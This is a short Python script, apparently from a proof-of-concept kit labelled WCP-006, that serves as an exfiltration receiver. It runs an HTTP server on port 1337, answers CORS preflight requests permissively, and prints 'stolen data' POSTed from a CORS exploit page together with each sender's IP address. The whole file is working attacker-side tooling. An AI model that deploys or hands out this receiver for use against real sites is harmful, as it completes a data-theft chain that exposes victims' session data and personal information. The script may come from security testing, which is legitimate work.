#!/usr/bin/env python3
"""
WCP-006 Exfil Receiver
Listens for stolen data POSTed from the CORS PoC page.
Run: python3 exfil-server.py
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import json, datetime, sys

PORT = 1337

class ExfilHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress default Apache-style log

    def do_OPTIONS(self):
        # CORS preflight — let the browser through
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        ts = datetime.datetime.now().strftime('%H:%M:%S')

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

        print(f"\n{'='*60}")
        print(f"[{ts}] EXFIL RECEIVED from {self.client_address[0]}")
        print(f"Path: {self.path}")
        print(f"{'='*60}")
        try:
            parsed = json.loads(body)
            print(json.dumps(parsed, indent=2))
        except Exception:
            print(body[:3000])
        print(f"{'='*60}\n")
        sys.stdout.flush()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'exfil server running\n')

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', PORT), ExfilHandler)
    print(f"[*] Exfil receiver listening on http://0.0.0.0:{PORT}")
    print(f"[*] Waiting for stolen data...\n")
    server.serve_forever()
